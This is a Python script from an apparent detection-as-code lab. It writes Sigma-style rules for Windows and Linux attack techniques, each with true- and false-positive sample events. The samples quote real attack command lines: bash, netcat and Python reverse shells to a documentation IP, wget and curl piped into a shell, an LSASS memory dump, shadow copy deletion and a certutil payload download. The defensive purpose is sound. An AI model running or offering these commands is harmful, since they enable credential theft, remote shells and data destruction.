"""One-off script used to create the initial rule set + samples (kept for transparency)."""
import json, uuid, yaml
from pathlib import Path
R = Path(__file__).resolve().parents[1]
PC = {"category": "process_creation", "product": "windows"}
LPC = {"category": "process_creation", "product": "linux"}
SEC = {"product": "windows", "service": "security"}
rules = [
 ("windows", "proc_encoded_powershell", "Encoded PowerShell command line", PC,
  {"selection_img": {"Image|endswith": ["\\powershell.exe", "\\pwsh.exe"]}, "selection_enc": {"CommandLine|contains": [" -enc ", " -encodedcommand ", " -e "]}, "condition": "selection_img and selection_enc"},
  ["attack.execution", "attack.t1059.001"], "high", ["Some SCCM / management agents"],
  [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA"}, {"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh -EncodedCommand ZQBjAGgAbwA= "}],
  [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1 -Environment prod"}, {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c echo -enc "}]),
 ("windows", "proc_lsass_dump_comsvcs", "LSASS dump via comsvcs.dll MiniDump", PC,
  {"selection": {"Image|endswith": "\\rundll32.exe", "CommandLine|contains|all": ["comsvcs", "minidump"]}, "condition": "selection"},
  ["attack.credential_access", "attack.t1003.001"], "critical", ["Unlikely"],
  [{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"}],
  [{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"}]),
 ("windows", "proc_certutil_download", "Certutil used to download a file", PC,
  {"selection": {"Image|endswith": "\\certutil.exe", "CommandLine|contains": ["urlcache", "verifyctl"]}, "selection_url": {"CommandLine|contains": ["http://", "https://"]}, "condition": "selection and selection_url"},
  ["attack.command_and_control", "attack.t1105"], "high", ["Admin scripts fetching CRLs (rare)"],
  [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.5/a.exe a.exe"}],
  [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -hashfile setup.msi SHA256"}]),
 ("windows", "proc_office_spawns_shell", "Office application spawning a shell", PC,
  {"parent": {"ParentImage|endswith": ["\\winword.exe", "\\excel.exe", "\\powerpnt.exe", "\\outlook.exe"]}, "child": {"Image|endswith": ["\\cmd.exe", "\\powershell.exe", "\\wscript.exe", "\\mshta.exe", "\\rundll32.exe"]}, "condition": "parent and child"},
  ["attack.execution", "attack.t1204.002", "attack.initial_access", "attack.t1566.001"], "high", ["Legit Office add-ins invoking scripts"],
  [{"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c powershell ..."}],
  [{"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"}, {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\cmd.exe"}]),
 ("windows", "proc_shadow_copy_delete", "Shadow copy deletion (ransomware precursor)", PC,
  {"vss": {"Image|endswith": "\\vssadmin.exe", "CommandLine|contains|all": ["delete", "shadows"]}, "wmic": {"Image|endswith": "\\wmic.exe", "CommandLine|contains|all": ["shadowcopy", "delete"]}, "condition": "vss or wmic"},
  ["attack.impact", "attack.t1490"], "critical", ["Backup software housekeeping"],
  [{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe Delete Shadows /All /Quiet"}, {"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy delete"}],
  [{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin list shadows"}]),
 ("windows", "sec_security_log_cleared", "Security event log cleared", SEC,
  {"selection": {"EventID": 1102}, "condition": "selection"},
  ["attack.defense_evasion", "attack.t1070.001"], "high", ["Planned log maintenance"],
  [{"EventID": 1102, "Channel": "Security"}], [{"EventID": 1100, "Channel": "Security"}, {"EventID": 104, "Channel": "System"}]),
 ("windows", "sec_machine_account_created_by_user", "Computer account created (name ends with $) via 4720", SEC,
  {"selection": {"EventID": 4720, "TargetUserName|endswith": "$"}, "condition": "selection"},
  ["attack.persistence", "attack.t1136.002"], "medium", ["Domain join by helpdesk accounts"],
  [{"EventID": 4720, "TargetUserName": "FAKE-PC$", "SubjectUserName": "bob"}], [{"EventID": 4720, "TargetUserName": "jdoe"}]),
 ("windows", "sec_service_install_suspicious_path", "Service installed from user-writable path", SEC,
  {"selection": {"EventID": [7045, 4697]}, "path": {"ImagePath|contains": ["\\Users\\Public\\", "\\AppData\\", "\\Temp\\", "%COMSPEC%", "powershell"]}, "condition": "selection and path"},
  ["attack.persistence", "attack.t1543.003", "attack.lateral_movement", "attack.t1569.002"], "high", ["Some updaters install from Temp"],
  [{"EventID": 7045, "ServiceName": "xQzT", "ImagePath": "%COMSPEC% /Q /c echo cd > \\\\127.0.0.1\\C$\\__out"}, {"EventID": 4697, "ImagePath": "C:\\Users\\Public\\svc.exe"}],
  [{"EventID": 7045, "ServiceName": "PSEXESVC", "ImagePath": "C:\\Windows\\PSEXESVC.exe"}, {"EventID": 7045, "ImagePath": "C:\\Program Files\\Vendor\\agent.exe"}]),
 ("linux", "lnx_reverse_shell_cmdline", "Reverse shell one-liner", LPC,
  {"bash": {"CommandLine|contains": ["/dev/tcp/", "/dev/udp/"]}, "nc": {"Image|endswith": ["/nc", "/ncat", "/netcat"], "CommandLine|contains": [" -e ", " -c "]}, "py": {"CommandLine|re": "python[23]?.*socket.*(dup2|pty)"}, "condition": "bash or nc or py"},
  ["attack.execution", "attack.t1059.004"], "critical", ["Pentest exercises"],
  [{"Image": "/bin/bash", "CommandLine": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"}, {"Image": "/usr/bin/nc", "CommandLine": "nc 198.51.100.7 4444 -e /bin/sh"}, {"Image": "/usr/bin/python3", "CommandLine": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);pty.spawn(\"sh\")'"}],
  [{"Image": "/usr/bin/nc", "CommandLine": "nc -zv 10.0.0.5 22"}, {"Image": "/bin/bash", "CommandLine": "bash -c 'cat /dev/null > /tmp/x'"}]),
 ("linux", "lnx_curl_pipe_shell", "Download piped directly into a shell", LPC,
  {"selection": {"CommandLine|re": "(curl|wget)[^|]*\\|\\s*(ba|z|da)?sh\\b"}, "condition": "selection"},
  ["attack.execution", "attack.t1059.004", "attack.command_and_control", "attack.t1105"], "medium", ["Vendor install scripts (rustup, docker get.sh)"],
  [{"CommandLine": "sh -c 'cd /tmp; wget http://203.0.113.99/x.sh -O- | sh'"}, {"CommandLine": "curl -s http://198.51.100.9/m | bash"}],
  [{"CommandLine": "curl -o out.tar.gz https://example.org/a.tgz"}, {"CommandLine": "wget https://example.org/sh-tutorial.pdf"}]),
]
for folder, name, title, ls, det, tags, lvl, fps, tp, fp in rules:
    d = {"title": title, "id": str(uuid.uuid5(uuid.NAMESPACE_URL, "dac/" + name)), "status": "experimental",
         "description": title + ". Part of Ansar Shaikh's detection-as-code lab.", "author": "Ansar Shaikh", "date": "2026/10/11",
         "tags": tags, "logsource": ls, "detection": det, "falsepositives": fps, "level": lvl}
    yaml.safe_dump(d, open(R / "rules" / folder / f"{name}.yml", "w"), sort_keys=False)
    s = R / "tests/samples" / name; s.mkdir(parents=True, exist_ok=True)
    for kind, evs in (("tp", tp), ("fp", fp)):
        (s / f"{kind}.jsonl").write_text("".join(json.dumps(e) + "\n" for e in evs))
